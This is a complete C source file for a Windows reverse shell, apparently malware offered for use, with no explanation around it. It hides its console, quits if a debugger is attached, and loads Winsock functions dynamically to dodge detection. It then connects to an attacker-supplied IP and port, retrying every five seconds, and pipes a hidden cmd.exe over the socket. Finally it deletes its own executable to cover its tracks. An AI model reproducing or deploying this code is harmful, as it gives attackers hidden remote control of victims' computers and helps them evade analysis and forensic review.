#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <winternl.h>

#pragma comment(lib, "ws2_32.lib")

typedef FARPROC(WINAPI* GetProcAddress_t)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI* LoadLibraryA_t)(LPCSTR);

void SelfDestruct(char* path) {
    char cmd[MAX_PATH + 50];
    wsprintfA(cmd, "cmd.exe /c ping 127.0.0.1 -n 3 > nul & del \"%s\"", path);
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    FreeConsole();
    
    if (IsDebuggerPresent()) return 1;

    int argc;
    LPWSTR *argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (argc < 3) return 1;

    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    char ip[256];
    wcstombs(ip, argv[1], 256);
    int port = _wtoi(argv[2]);

    HMODULE hWs2 = LoadLibraryA("ws2_32.dll");
    if (!hWs2) return 1;

    FARPROC pWSAStartup = GetProcAddress(hWs2, "WSAStartup");
    FARPROC pWSASocketA = GetProcAddress(hWs2, "WSASocketA");
    FARPROC pWSAConnect = GetProcAddress(hWs2, "WSAConnect");
    FARPROC pInet_pton = GetProcAddress(hWs2, "inet_pton");
    FARPROC phtons = GetProcAddress(hWs2, "htons");

    if (!pWSAStartup || !pWSASocketA || !pWSAConnect || !pInet_pton || !phtons) return 1;

    WSADATA wsaData;
    if (((int(WINAPI*)(WORD, LPWSADATA))pWSAStartup)(MAKEWORD(2, 2), &wsaData) != 0) return 1;

    SOCKET s = ((SOCKET(WINAPI*)(int, int, int, LPWSAPROTOCOL_INFOA, GROUP, DWORD))pWSASocketA)(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET) return 1;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = ((u_short(WINAPI*)(u_short))phtons)(port);
    ((int(WINAPI*)(INT, PCSTR, PVOID))pInet_pton)(AF_INET, ip, &addr.sin_addr);

    while (((int(WINAPI*)(SOCKET, const struct sockaddr*, int, LPWSABUF, LPWSABUF, LPQOS, LPQOS))pWSAConnect)(s, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        Sleep(5000);
    }

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
    si.wShowWindow = SW_HIDE;

    char cmd[] = "cmd.exe";
    if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        closesocket(s);
        return 1;
    }

    SelfDestruct(path);

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(s);

    return 0;
}
